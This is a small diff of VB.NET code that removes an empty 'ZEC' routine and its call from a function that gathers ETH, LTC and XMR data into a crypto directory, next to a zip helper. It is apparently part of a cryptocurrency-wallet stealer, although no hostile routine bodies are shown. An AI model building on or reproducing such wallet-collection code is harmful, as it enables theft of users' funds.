@@ -113,9 +113,6 @@
         End Try
     End Sub
 
-    Public Shared Sub ZEC(ByVal directorypath As String)
-    End Sub
-
     Public Shared Sub Zip(ByVal dir As String, ByVal zipPath As String)
         Try
             IO.Compression.ZipFile.CreateFromDirectory(dir, zipPath, IO.Compression.CompressionLevel.Optimal, False)
@@ -131,7 +128,6 @@
         Crypto.ETH(cryptoDir)
         Crypto.LTC(cryptoDir)
         Crypto.XMR_(cryptoDir)
-        Crypto.ZEC(cryptoDir)
         Return count
     End Function
 
